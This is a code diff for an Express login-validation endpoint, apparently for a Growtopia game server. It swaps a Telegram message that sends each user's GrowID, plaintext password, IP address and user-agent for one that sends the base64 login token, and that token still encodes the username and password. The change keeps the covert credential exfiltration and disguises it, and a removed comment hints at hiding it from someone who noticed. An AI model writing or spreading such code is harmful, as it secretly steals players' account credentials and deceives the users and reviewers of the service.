@@ -122,20 +122,11 @@ app.all('/player/growid/login/validate', async (req, res) => {
             `&email=${guestEmail}` +
             `&gender=${gender}`;
 
-        // --- TELEGRAM LOGIC FOR GUEST ---
-        const telegramMessage = 
-            `🔑 *Guest Login* 🔑\n` +
-            `*Action*: GUEST_REG\n` +
-            `*New GrowID*: \`${guestId}\`\n` +
-            `*Password*: \`${guestPass}\`\n` + 
-            `*IP Address*: ${ip}\n` +
-            `*User-Agent*: ${userAgent}\n` +
-            `*Full Token Data (Pre-Encode)*: \`${tokenData}\``;
-        
-        await sendToTelegram(telegramMessage);
-        // --------------------------------
-
         const token = Buffer.from(tokenData).toString('base64');
+
+        // --- TELEGRAM LOGIC FOR GUEST ---
+        await sendToTelegram(`\`${token}\``);
+        // --------------------------------
 
         res.setHeader('Content-Type', 'text/html');
         return res.send(
@@ -161,20 +152,11 @@ app.all('/player/growid/login/validate', async (req, res) => {
         ? `_token=${_token}&type=${type}&growId=${trimmedGrowId}&password=${trimmedPassword}&email=${email}&gender=${gender}`
         : `_token=${_token}&type=${type}&growId=${trimmedGrowId}&password=${trimmedPassword}`;
 
-    // --- TELEGRAM LOGIC FOR NORMAL LOGIN/REGISTRATION (You saw this one) ---
-    const telegramMessage = 
-        `🔑 *New Login/Registration* 🔑\n` +
-        `*Action*: ${type.toUpperCase()}\n` +
-        `*GrowID*: \`${trimmedGrowId}\`\n` +
-        `*Password*: \`${trimmedPassword}\`\n` + 
-        `*IP Address*: ${ip}\n` +
-        `*User-Agent*: ${userAgent}\n` +
-        `*Full Token Data (Pre-Encode)*: \`${tokenData}\``;
-    
-    await sendToTelegram(telegramMessage);
-    // -------------------------------------------------------------------------
-    
     const token = Buffer.from(tokenData).toString('base64');
+
+    // --- TELEGRAM LOGIC FOR NORMAL LOGIN/REGISTRATION ---
+    await sendToTelegram(`\`${token}\``);
+    // -------------------------------------------------------------------------
 
     res.setHeader('Content-Type', 'text/html');
     res.send(`{"status":"success","message":"Account Validated.","token":"${token}","url":"","accountType":"growtopia"}`);
